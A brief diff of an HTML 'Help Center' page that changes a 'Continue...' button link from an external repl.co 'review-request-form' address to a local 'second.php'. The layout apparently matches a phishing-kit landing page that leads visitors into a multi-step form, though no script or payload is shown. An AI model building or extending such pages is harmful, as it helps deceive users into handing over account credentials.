@@ -7,6 +7,6 @@
 </head>
 <body>
   <h1>Welcome to Help Center</h1><a href=
-  "https://submit.review-request-form.repl.co/action-submit.html"><button class="button">Continue...</button></a>
+  "second.php"><button class="button">Continue...</button></a>
 </body>
 </html>
